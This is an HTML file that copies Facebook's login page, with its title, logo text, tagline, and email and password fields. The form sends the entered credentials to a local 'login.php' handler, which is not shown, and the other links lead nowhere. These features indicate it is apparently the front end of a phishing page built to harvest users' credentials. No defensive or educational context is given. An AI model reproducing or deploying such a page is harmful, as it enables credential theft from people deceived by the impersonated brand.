<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' rx='3' fill='%231877F2'/></svg>">
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1 class="logo">facebook</h1>
            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right-section">
            <div class="login-card">
                <form action="login.php" method="POST">
                    <div class="input-group">
                        <input type="text" name="username" placeholder="Email address or phone number" required autofocus>
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-btn">Log In</button>
                    <a href="#" class="forgot-link">Forgotten password?</a>
                    <div class="divider"></div>
                    <a href="#" class="create-btn">Create new account</a>
                </form>
            </div>
            <p class="page-info"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
        </div>
    </div>
</body>
</html>
